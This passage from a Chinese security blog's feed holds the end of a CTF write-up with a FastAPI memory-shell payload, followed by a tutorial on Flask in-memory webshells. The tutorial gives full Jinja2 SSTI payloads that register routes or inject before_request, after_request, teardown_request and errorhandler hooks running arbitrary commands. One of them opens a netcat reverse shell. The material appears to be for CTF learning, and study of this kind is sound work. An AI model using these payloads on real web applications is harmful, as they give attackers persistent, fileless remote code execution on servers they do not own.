class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec uvicorn app:app --host 0.0.0.0 --port 8000</span><br></pre></td></tr></table></figure><p><code>uvicorn</code>用于启动 Uvicorn ASGI 服务器，<code>app:app</code>格式是<code>module_name:variable_name</code></p><p>所以本质上它是通过这个起的服务，我本地就是运行python脚本起的服务自然不一样</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;app&#x27;].app.middleware<span class="built_in">_</span>stack.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;app&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>这样就打通了</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题还是很不错的，增加了我对ssti，反弹shell，linux提权，内存马的理解！</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> ssti </tag>
            
            <tag> fastapi内存马 </tag>
            
            <tag> sudo提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask下的内存马</title>
      <link href="/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="什么是内存马"><a href="#什么是内存马" class="headerlink" title="什么是内存马"></a>什么是内存马</h3><p>内存马是一种<strong>无文件落地</strong>的恶意代码。不同于传统的webshell：通常是一个文件。攻击者利用某些中间件的进程执行内存马，从而进行getshell！</p><h3 id="flask的内存马又怎么说"><a href="#flask的内存马又怎么说" class="headerlink" title="flask的内存马又怎么说"></a>flask的内存马又怎么说</h3><p>就是利用flask的ssti漏洞，进行插入内存马！与其说是flask的ssti，不如说是jinja2的，模板引擎是jinja2！</p><h2 id="旧马（flask2-x）"><a href="#旧马（flask2-x）" class="headerlink" title="旧马（flask2.x）"></a>旧马（flask2.x）</h2><h3 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>我们对pyaload进行逐一分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>先就是找eval用于python代码，当然exec也可以！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span></span><br></pre></td></tr></table></figure><p>app是Flask类的实例，简单来说就是Flask应用本身！</p><p>add_url_rule是Flask框架中的一个核心方法，用于手动添加URL路由规则！</p><p>我们通过跟进route这个装饰器函数，找到add_url_rule在跟进它，拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_url_rule</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        rule: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        endpoint: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        view_func: ft.RouteCallable | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        provide_automatic_options: <span class="built_in">bool</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        **options: t.<span class="type">Any</span>,</span></span><br><span class="line"><span class="params">    </span>)</span><br></pre></td></tr></table></figure><p>主要就是看三个参数</p><ul><li>rule：函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头</li><li>endpoint：路由的端点名称，是一个标识符，用于在 Flask 内部引用这个路由。说白了就是一个函数名</li><li>view_func：处理这个路由请求的视图函数，当客户端访问这个路径时，会调用这个函数。</li></ul><p>接下来就看调用的这个函数了</p><p>lambda是一个无名函数，:后面是一个表达式用于实现函数的功能！这里就是导入命令函数，那么<code>_request_ctx_stack.top</code>这个又是什么玩意？</p><h4 id="flask请求上下文机制"><a href="#flask请求上下文机制" class="headerlink" title="flask请求上下文机制"></a>flask请求上下文机制</h4><blockquote><p>当网页请求进入<code>Flask</code>时, 会实例化一个<code>Request Context</code>. 在<code>Python</code>中分出了两种上下文: 请求上下文(request context)、应用上下文(session context). 一个请求上下文中封装了请求的信息, 而上下文的结构是运用了一个<code>Stack</code>的栈结构, 也就是说它拥有一个栈所拥有的全部特性. <code>request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</p></blockquote><p>那么说白了就是请求的储存的结构式栈结构，后进先出，然后通过<code>_request_ctx_stack.top</code>获取栈顶元素也就是最新请求！</p><p>那么这里我们就明白了</p><p><code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)</code>就是获得请求的cmd参数，默认值是whoami</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>eval的第二个参数是个字典用于声明里面的全局变量，用来指定<code>exec()</code> 或 <code>eval()</code> 的<strong>第一个参数（即要执行的代码字符串）中引用的、但并未在代码字符串内部定义</strong>的那些变量</p><p>到这整个pyload就分析完了</p><h3 id="本地test"><a href="#本地test" class="headerlink" title="本地test"></a>本地test</h3><p>首先安装</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install flask==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line">pip install werkzeug==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>接下来就是运行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    template=<span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    &lt;p&gt;Hello %s &lt;/p&gt;&#x27;&#x27;&#x27;</span>%(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)      <span class="comment"># 渲染为html内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:          <span class="comment"># 如果作为脚本运行，而不是被当成模块导入</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>打入内存马，进行命令执行</p><p><img src="/images/achieve/2025/10/4.png"></p><p>成功非常nice！</p><h2 id="新马（flask3-x）"><a href="#新马（flask3-x）" class="headerlink" title="新马（flask3.x）"></a>新马（flask3.x）</h2><p>为啥新版本的不行？主要是报错</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">AssertionError: <span class="title">The</span> <span class="title">setup</span> <span class="title">method</span> &#x27;<span class="title">add_url_rule</span>&#x27; <span class="title">can</span> <span class="title">no</span> <span class="title">longer</span> <span class="title">be</span> <span class="title">called</span> <span class="title">on</span> <span class="title">the</span> <span class="title">application</span>. <span class="title">It</span> <span class="title">has</span> <span class="title">already</span> <span class="title">handled</span> <span class="title">its</span> <span class="title">first</span> <span class="title">request</span>, <span class="title">any</span> <span class="title">changes</span> <span class="title">will</span> <span class="title">not</span> <span class="title">be</span> <span class="title">applied</span> <span class="title">consistently</span>.</span></span><br></pre></td></tr></table></figure><p>在应用启动之后说是不能用add_url_rule进行添加路由！</p><h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><p>什么是装饰器？</p><p>装饰器是一种用于<strong>修改或增强函数或方法行为</strong>的高级函数。装饰器本质上是一个接受函数作为参数并返回一个新函数的函数。</p><h4 id="利用before-request"><a href="#利用before-request" class="headerlink" title="利用before_request"></a>利用before_request</h4><p>before_request 方法允许我们在每个请求之前执行一些操作,跟进它</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f: T_before_request</span>) -&gt; T_before_request:</span><br><span class="line">    <span class="variable language_">self</span>.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p><code>self.before_request_funcs</code> 是 Flask 应用对象中的一个属性。它是一个 <strong>字典</strong>，用于存储在请求处理之前需要执行的钩子函数。</p><p><code>setdefault(None,[]).append(f)</code>这个其实就是用来增加新的钩子函数的！那么我们插入lambda:<strong>import</strong>(‘os’).popen(_request_ctx_stack.top.request.args.get(‘cmd’, ‘whoami’)).read()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;</span>,&#123;<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>如果不定义字典也可以去sys.modules里面去找</p><blockquote><p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然找app这个对象的方法不绝对，随机应变即可</p><p>这个payload的缺点就是只能用一次，毕竟你打入之后每次请求之前就会执行我们插入的lambda函数！</p><h4 id="利用after-request"><a href="#利用after-request" class="headerlink" title="利用after_request"></a>利用after_request</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">self, f</span>):</span><br><span class="line">    <span class="variable language_">self</span>.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p>先自己整一整</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;app.after<span class="built_in">_</span>request<span class="built_in">_</span>funcs.setdefault(None, []).append(lambda:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;,&#123;&#x27;app&#x27;:url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;current<span class="built_in">_</span>app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>为什么不行（在before_request的基础上改），打入进去之后每次请求之后就会就是执行我们的函数，但是这不是响应啊哥们</p><p>来分析正确的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    app.after_request_funcs.setdefault(None, []).append(</span></span><br><span class="line"><span class="string">        lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(</span></span><br><span class="line"><span class="string">            \&quot;\&quot;\&quot;</span></span><br><span class="line"><span class="string">            global CmdResp;</span></span><br><span class="line"><span class="string">            CmdResp = __import__(&#x27;flask&#x27;).make_response(</span></span><br><span class="line"><span class="string">                __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">            \&quot;\&quot;\&quot;</span></span><br><span class="line"><span class="string">        ) == None else resp</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>resp</code> 代表 Response Object (响应对象)就是原来的响应！<code>__import__(&#39;flask&#39;).make_response()</code>这里就可看到是需要调用make_response()这个函数来生成新的响应内容的</p><p><img src="/images/achieve/2025/10/5.png"></p><p>这个就爽多了！</p><h3 id="hook函数"><a href="#hook函数" class="headerlink" title="hook函数"></a>hook函数</h3><p>这个上面就用到了，插入的就是我们定义的钩子函数</p><blockquote><p>本质是：允许用户在某个特定时机插入自定义逻辑的一种机制，通俗点讲就是，钩子函数就像是在一个流程中预留出来的挂钩点，你可以挂上自己的函数来改变或增强原有的行为<br>这个是不是和前面的装饰器（增强函数行为）有点像，其实装饰器是就是通过钩子函数来增强函数的行为的</p></blockquote><p>特点：</p><ul><li>预定义的调用时机：不是你直接调用钩子函数，而是某个系统、框架或库在合适的时候自动调用它。</li><li>用户自定义逻辑：你写的函数会被当作 “钩子” 插入原流程中执行。</li><li>可插拔、灵活扩展：不需要改动原代码，就可以通过钩子增强功能</li></ul><h4 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a>teardown_request</h4><blockquote><p>teardown_request 是在每个请求的最后阶段执行的，即在视图函数处理完成并生成响应后，或者在请求中发生未处理的异常时，都会执行这个钩子。</p><p>它执行的时机是在响应已经确定之后，但在最终发送给客户端之前。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">teardown_request</span>(<span class="params">self, f</span>):</span><br><span class="line">        <span class="variable language_">self</span>.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">        <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p>由于是无回显所以反弹shell和写入文件都可以</p><p>反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;mkfifo /tmp/fifo; /bin/sh -i &lt; /tmp/fifo | nc ip port &gt; /tmp/fifo; rm /tmp/fifo&#x27;))&quot;</span>)</span><br></pre></td></tr></table></figure><p>写入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls &gt; 11.txt&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h4><p>此函数可以用于自定义 404 页面的回显，用于处理应用程序中发生的错误，当你 flask 遇到错误，你可以定义自定义的错误处理程序来处理错误并返回适当的响应</p><p>跟进拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">errorhandler</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span></span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Callable</span>[[T_error_handler], T_error_handler]:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">f: T_error_handler</span>) -&gt; T_error_handler:</span><br><span class="line">        <span class="variable language_">self</span>.register_error_handler(code_or_exception, f)      <span class="comment">#这个是去注册f</span></span><br><span class="line">        <span class="keyword">return</span> f         <span class="comment">#返回的是错误处理函数</span></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"><span class="comment"># T_error_handler   错误处理函数的类型</span></span><br></pre></td></tr></table></figure><p>继续跟进看看是怎么注册的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register_error_handler</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">        f: ft.ErrorHandlerCallable,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        exc_class, code = <span class="variable language_">self</span>._get_exc_class_and_code(code_or_exception)</span><br><span class="line">        <span class="variable language_">self</span>.error_handler_spec[<span class="literal">None</span>][code][exc_class] = f</span><br></pre></td></tr></table></figure><p>这里注册就是error_handler_spec，它的结构：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">self.error<span class="built_in">_</span>handler<span class="built_in">_</span>spec = &#123;</span><br><span class="line">    None: &#123;</span><br><span class="line">        404: &#123;</span><br><span class="line">            HTTPException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>404,</span><br><span class="line">            AnotherException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>another,</span><br><span class="line">        &#125;,</span><br><span class="line">        500: &#123;</span><br><span class="line">            HTTPException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>500,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说通过code和exc_class去注册这个f（错误处理函数），</p><p>但是这两家伙由_get_exc_class_and_code(code_or_exception)这个控制</p><blockquote><p>这个定义的函数 _get_exc_class_and_code 是用来处理异常类或 HTTP 状态码的。函数接受一个参数，exc_class_or_code，可以是一个异常类或者一个 HTTP 状态码（整型）。</p></blockquote><p>那么接下来直接控制f不就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__.<span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read()&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__.<span class="built_in">exec</span>(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">global exc_class</span></span><br><span class="line"><span class="string">global code</span></span><br><span class="line"><span class="string">exc_class, code = app._get_exc_class_and_code(404)</span></span><br><span class="line"><span class="string">app.error_handler_spec[None][code][exc_class] =</span></span><br><span class="line"><span class="string">lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>因为是在exec里面必须指定exec的由来，不像之前ssti里面打的</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(request.values.x).read()&#125;&#125;<span class="built_in">&amp;</span>x=cat /f*</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>也算是学了一下原理，主要就是老马：加路由！新马：主要就是打入钩子函数，在特定的时机去触发！</p><p>当然不只是flask框架下可以打内存马，不同的框架有不同的打法，但原理估摸着都类似吧！</p><p>比如：<a href="https://www.caterpie771.cn/archives/333#%E7%BB%8F%E5%85%B8%E8%B7%AF%E7%BA%BF%EF%BC%9A%E6%89%93%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0">FastAPI 内存马的研究 - caterpie的小站</a></p>]]></content>
      
      
      <categories>
          
          <category> python内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星途ctf2025</title>
      <link href="/2025/10/26/%E6%98%9F%E9%80%94ctf2025/"/>
      <url>/2025/10/26/%E6%98%9F%E9%80%94ctf2025/</url>
      
